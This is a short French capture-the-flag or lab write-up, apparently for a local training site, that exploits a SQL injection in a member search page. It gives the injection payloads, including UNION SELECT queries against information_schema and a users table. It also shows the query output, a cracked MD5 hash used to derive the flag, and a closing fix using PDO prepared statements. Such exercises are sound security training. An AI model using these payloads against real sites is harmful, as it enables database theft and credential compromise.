# SQL Injection members

## Trouver la faille

Sur ce lien : http://192.168.0.32/?page=member
On peut afficher tous les utilisateurs en écrivant dans la barre recherche ou dans le lien directement
```bash
0 or 1
```
qui est égale a True

On utilisant UNION on peut selectionner tout ce qu'on a besoin d'afficher comme db, table, colonne depuis la base information_schema qui contient tout les informations a propos des bdd

```sql
0 or 1 UNION select table_name, column_name FROM information_schema.columns
```
On trouve une table user qui contient pleins de colonne et parmis ces colonne on s'intéresse au commentaire et countersign

```sql
0 or 1 UNION SELECT Commentaire, countersign FROM users

result:
ID: 0 or 1 UNION SELECT Commentaire, countersign FROM users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

On va décrypter ce code 5ff9d0165b4f92b14994e5c685cdce28 avec md5 on trouve la clé "FortyTwo" on enléve les majuscule et on crypte avec Sh256


## Comment utiliser cette faille
On peut récuperer tout les donnnées de la bdd

## Solution
Il faut utiliser des requetes SQL prepared telsque PDO en ajoutant cette ligne 
```php
$connexion = new PDO('mysql:dbname=dbtest;host=127.0.0.1;charset=utf8', 'utilisateur', 'motDePasse');
$connexion->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
```
Prepare: An SQL statement template is created and sent to the database

